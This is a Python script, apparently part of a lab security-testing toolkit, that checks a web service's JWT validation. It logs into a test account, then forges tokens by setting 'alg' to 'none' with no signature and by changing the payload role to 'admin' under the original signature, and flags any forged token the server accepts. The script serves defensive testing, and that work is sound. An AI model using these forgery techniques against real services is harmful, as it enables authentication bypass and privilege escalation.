#!/usr/bin/env python3
"""
RASD-Red · JWT validation (forged web credentials).

Logs in as a lab test account, then replays its token three ways against a protected
endpoint: unchanged (baseline, must work), re-encoded with "alg": "none" and no signature,
and with a modified payload but the original signature. Either forged token being
accepted is a FINDING. Read-only GET requests against a lab target (see rasd_web.py).
"""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import rasd_web  # noqa: E402


def b64d(part: str) -> dict:
    return json.loads(base64.urlsafe_b64decode(part + "=" * (-len(part) % 4)))


def b64e(obj: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).decode().rstrip("=")


def main() -> int:
    ap = rasd_web.base_parser(__doc__)
    ap.add_argument("--path", default="/rest/basket/{bid}", help="protected path; {bid} is the account's basket id")
    args = ap.parse_args()
    target = rasd_web.check_args(args)
    client = rasd_web.Client(target, args.marker)
    auth = client.login(*rasd_web.lab_credentials())
    token = auth["token"]
    path = args.path.format(bid=auth.get("bid", 1))
    header_b64, payload_b64, signature = token.split(".")
    header, payload = b64d(header_b64), b64d(payload_b64)

    unsigned = f"{b64e({**header, 'alg': 'none'})}.{payload_b64}."
    tampered_payload = json.loads(json.dumps(payload))
    if isinstance(tampered_payload.get("data"), dict):
        tampered_payload["data"]["role"] = "admin"
    else:
        tampered_payload["role"] = "admin"
    tampered = f"{header_b64}.{b64e(tampered_payload)}.{signature}"

    findings = []
    status, _h, _b = client.request("GET", path, token=token)
    findings.append({"check": f"GET {path} with the genuine token (baseline)", "result": "INFO" if status == 200 else "REVIEW",
                     "detail": f"HTTP {status}"})
    for label, forged in (("alg none, no signature", unsigned), ("payload changed, original signature", tampered)):
        status, _h, _b = client.request("GET", path, token=forged)
        result = "PASS" if status in (401, 403) else ("FINDING" if 200 <= status < 300 else "REVIEW")
        findings.append({"check": f"GET {path} with a token: {label}", "result": result, "detail": f"HTTP {status}"})
    return rasd_web.report("jwt_testing", args.marker, findings, client)


if __name__ == "__main__":
    rasd_web.run(main)
